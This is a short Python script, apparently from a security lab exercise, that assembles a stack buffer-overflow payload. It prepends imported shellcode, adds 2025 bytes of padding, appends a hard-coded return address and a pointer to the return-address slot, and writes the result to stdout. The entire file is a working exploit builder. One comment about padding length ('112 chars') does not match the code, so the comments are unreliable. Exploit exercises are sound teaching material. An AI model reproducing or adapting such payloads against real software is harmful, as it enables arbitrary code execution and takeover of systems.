from shellcode import shellcode
from struct import pack 
import sys

vuln_str = 'l'*2025 #112 chars until return address
vuln_bytes = bytes(vuln_str, 'utf-8')
return_address = pack("<I", 0xfffe9498) #a
address_of_return_address = pack("<I", 0xfffe9cac)#pointer *p (points to RA memory)

#payload = vuln_bytes + return_address
payload = shellcode + vuln_bytes + return_address + address_of_return_address
sys.stdout.buffer.write(payload)